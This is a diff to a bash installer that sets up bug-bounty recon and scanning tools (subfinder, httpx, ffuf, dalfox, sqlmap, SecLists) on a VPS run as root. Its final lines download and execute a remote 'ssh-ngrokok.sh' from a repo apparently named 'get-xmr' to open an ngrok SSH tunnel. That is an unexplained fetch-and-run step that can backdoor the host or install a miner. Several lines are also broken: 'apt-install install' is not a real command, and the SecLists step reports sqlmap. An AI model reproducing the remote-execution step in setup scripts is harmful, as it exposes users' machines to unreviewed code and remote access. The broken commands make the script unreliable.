@@ -1,7 +1,6 @@
 #!/bin/bash -i
 
 #Creating tools directory if not exist
-mkdir -p /root/OK-VPS/tools /root/OK-VPS/tools/file /root/wordlist /root/templates;
 clear;
 
 ENVIRONMENT () {
@@ -24,19 +23,22 @@ ENVIRONMENT () {
     pip3 install lxml > /dev/null 2>&1;
 }
 SUBDOMAINS_ENUMERATION () {
-       #Golang
+    #Golang
     echo -e ${BLUE}"[SUBDOMAINS ENUMERATION]" ${RED}"Golang installation in progress ...";
-    cd /root/OK-VPS/tools/file && wget https://go.dev/dl/go1.20.5.linux-amd64.tar.gz && tar -zxvf go1.20.5.linux-amd64.tar.gz -C /usr/local/ && mkdir ~/.go && GOROOT=/usr/local/go && GOPATH=~/.go && PATH=$PATH:$GOROOT/bin:$GOPATH/bin && update-alternatives --install "/usr/bin/go" "go" "/usr/local/go/bin/go" 0 && update-alternatives --set go /usr/local/go/bin/go;
+    wget https://go.dev/dl/go1.20.5.linux-amd64.tar.gz && tar -zxvf go1.20.5.linux-amd64.tar.gz -C /usr/local/ && mkdir ~/.go && GOROOT=/usr/local/go && GOPATH=~/.go && PATH=$PATH:$GOROOT/bin:$GOPATH/bin && update-alternatives --install "/usr/bin/go" "go" "/usr/local/go/bin/go" 0 && update-alternatives --set go /usr/local/go/bin/go;
+    rm go1.20.5.linux-amd64.tar.gz
+    #Recon-ng
     echo -e ${BLUE}"[SUBDOMAINS ENUMERATION]" ${RED}"Recon-ng installation in progress ...";
-    git clone https://github.com/lanmaster53/recon-ng.git && cd recon-ng && pip install -r REQUIREMENTS
+    git clone https://github.com/lanmaster53/recon-ng.git && cd recon-ng && pip install -r REQUIREMENTS;
+    #subfinder
     echo -e ${BLUE}"[SUBDOMAINS ENUMERATION]" ${RED}"Subfinder installation in progress ...";
-    go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+    go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest;
 }
 HTTP_PROBE () {
     #httpx
     echo -e ${BLUE}"[HTTP PROBE]" ${RED}"httpx installation in progress ...";
     GO111MODULE=on go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest > /dev/null 2>&1 && ln -s ~/go/bin/httpx /usr/local/bin/;
-    echo -e ${BLUE}"[HTTP PROBE]" ${GREEN}"Httpx installation is done !"; echo "";
+    echo -e ${BLUE}"[HTTP PROBE]" ${GREEN}"Httpx installation is done !";
     #httprobe
     echo -e ${BLUE}"[HTTP PROBE]" ${RED}"httprobe installation in progress ...";
     go install github.com/tomnomnom/httprobe@latest > /dev/null 2>&1 && ln -s ~/go/bin/httprobe /usr/local/bin/;
@@ -45,7 +47,7 @@ HTTP_PROBE () {
 WEB_CRAWLING () {
     #ParamSpider
     echo -e ${BLUE}"[WEB CRAWLING]" ${RED}"ParamSpider installation in progress ...";
-    cd /root/OK-VPS/tools && git clone https://github.com/devanshbatham/ParamSpider > /dev/null 2>&1 && cd ParamSpider && pip3 install -r requirements.txt 
+    git clone https://github.com/devanshbatham/ParamSpider > /dev/null 2>&1 && cd ParamSpider && pip3 install -r requirements.txt ;
     echo -e ${BLUE}"[WEB CRAWLING]" ${GREEN}"ParamSpider installation is done !"; echo "";
     #Waybackurls
     echo -e ${BLUE}"[WEB CRAWLING]" ${RED}"Waybackurls installation in progress ...";
@@ -62,7 +64,7 @@ HTTP_PARAMETER () {
 FUZZING_TOOLS () {
     #ffuf
     echo -e ${BLUE}"[FUZZING TOOLS]" ${RED}"ffuf installation in progress ...";
-    go install github.com/ffuf/ffuf@latest > /dev/null 2>&1 && ln -s ~/go/bin/ffuf /usr/local/bin/;
+    go install github.com/ffuf/ffuf@latest > /dev/null 2>&1;
     echo -e ${BLUE}"[FUZZING TOOLS]" ${GREEN}"ffuf installation is done !"; echo "";
 }
 API_TOOLS () {
@@ -75,28 +77,27 @@ API_TOOLS () {
 VULNS_XSS () {
     #Dalfox
     echo -e ${BLUE}"[VULNERABILITY - XSS]" ${RED}"Dalfox installation in progress ...";
-    GO111MODULE=on go install -v github.com/hahwul/dalfox/v2@latest > /dev/null 2>&1 && ln -s ~/go/bin/dalfox /usr/local/bin/;
+    GO111MODULE=on go install -v github.com/hahwul/dalfox/v2@latest > /dev/null 2>&1
     echo -e ${BLUE}"[VULNERABILITY - XSS]" ${GREEN}"Dalfox installation is done !"; echo "";
 }
 
 VULNS_SQLI () {
     #SQLmap
     echo -e ${BLUE}"[VULNERABILITY - SQL Injection]" ${RED}"SQLMap installation in progress ...";
-    apt-install install -y sqlmap > /dev/null 2>&1
+    apt-install install -y sqlmap > /dev/null 2>&1;
     echo -e ${BLUE}"[VULNERABILITY - SQL Injection]" ${GREEN}"SQLMap installation is done !"; echo "";
     
 }
-VULNS_SCANNER () {
-    #Jaeles
-    echo -e ${BLUE}"[VULNERABILITY SCANNER]" ${RED}"Sqlmap installation in progress ...";
-    apt install sqlmap
-    echo -e ${BLUE}"[VULNERABILITY SCANNER]" ${GREEN}"Sqlmap installation is done !"; echo "";
 
+SEC_LISTS () {
+    echo -e ${BLUE}"[VULNERABILITY SCANNER]" ${RED}"Seclists installation in progress ...";
+    git clone https://github.com/danielmiessler/SecLists.git ;
+    echo -e ${BLUE}"[VULNERABILITY SCANNER]" ${GREEN}"Sqlmap installation is done !"; echo "";
 }
 USEFUL_TOOLS () {
     #anew
     echo -e ${BLUE}"[USEFUL TOOLS]" ${RED}"anew installation in progress ...";
-    go install github.com/tomnomnom/anew@latest > /dev/null 2>&1 && ln -s ~/go/bin/anew /usr/local/bin/;
+    go install github.com/tomnomnom/anew@latest > /dev/null 2>&1;
     echo -e ${BLUE}"[USEFUL TOOLS]" ${GREEN}"anew installation is done !"; echo "";
 
     #Tmux
@@ -104,6 +105,9 @@ USEFUL_TOOLS () {
     apt-install install tmux -y > /dev/null 2>&1;
     echo -e ${BLUE}"[USEFUL TOOLS]" ${GREEN}"Tmux installation is done !"; echo "";
 }
-ENVIRONMENT && SUBDOMAINS_ENUMERATION && HTTP_PROBE && HTTP_PARAMETER && FUZZING_TOOLS && API_TOOLS  && VULNS_XSS && VULNS_SQLI && VULNS_SCANNER && USEFUL_TOOLS;
-echo -e "setup ngrok ssh tunnel..."
+ENVIRONMENT && SUBDOMAINS_ENUMERATION && HTTP_PROBE && HTTP_PARAMETER && FUZZING_TOOLS && API_TOOLS  && VULNS_XSS && VULNS_SQLI && USEFUL_TOOLS && SEC_LISTS ;
+echo -e ${BLUE}"coping tools into /usr/bin"
+cp ~/go/bin/* /usr/bin/
+echo -e ${BLUE}"setup ngrok ssh tunnel ..."
 wget https://raw.githubusercontent.com/a2nk/get-xmr/main/ssh-ngrokok.sh && chmod +x ssh-ngrokok.sh && ./ssh-ngrokok.sh
+echo -e ${BLUE}"Done."
